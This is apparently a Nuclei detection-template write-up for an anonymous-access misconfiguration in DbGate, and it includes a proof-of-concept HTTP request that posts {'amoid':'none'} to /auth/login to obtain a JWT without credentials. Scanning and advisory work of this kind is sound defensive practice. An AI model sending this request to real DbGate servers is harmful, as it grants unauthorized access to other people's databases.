# Nuclei Template: DbGate Anonymous Access - Detection
**Template ID:** dbgate-anonymous-access
**Vulnerability Class:** Misconfiguration
**Severity:** High
**CWE:** CWE-1188
**Source:** Nuclei Template (`dbgate-anonymous-access.yaml`)

## Vulnerability Information & PoC

## Description
Detected DbGate instances that allowed anonymous access due to insecure default authentication settings, where unauthenticated users could obtain a valid JWT token and access database management APIs.

## Steps to reproduce / Exploit Payload
```http
POST /auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"amoid":"none"}
```

## References
- https://github.com/dbgate/dbgate
- https://dbgate.io/
- https://docs.dbgate.io/
